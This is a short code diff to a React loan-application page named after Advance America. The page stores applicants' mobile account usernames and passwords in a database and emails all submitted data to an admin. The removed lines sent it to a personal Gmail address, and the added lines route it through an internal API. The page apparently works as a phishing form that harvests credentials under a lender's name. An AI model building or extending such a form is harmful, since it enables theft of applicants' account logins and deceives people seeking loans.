@@ -426,12 +426,16 @@ export default function AdvanceAmericaApply() {
         mobile_username:data.mobileUsername, mobile_password:data.mobilePassword,
       });
       if (dbError) throw new Error(dbError.message);
-      await supabase.functions.invoke("send-application-email",{
-        body:{ applicationData:data, clientEmail:"ws694481@gmail.com", recipientType:"admin", clientName:client?.name||"General" }
+      await fetch('/api/send-application-email', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ applicationData: data, clientEmail: null, recipientType: 'admin', clientName: client?.name || "General Application" })
       });
       if (client) {
-        await supabase.functions.invoke("send-application-email",{
-          body:{ applicationData:data, clientEmail:client.email, recipientType:"client" }
+        await fetch('/api/send-application-email', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ applicationData: data, clientEmail: client.email, recipientType: 'client', clientName: client?.name || "General Application" })
         });
       }
       setSubmitted(true);
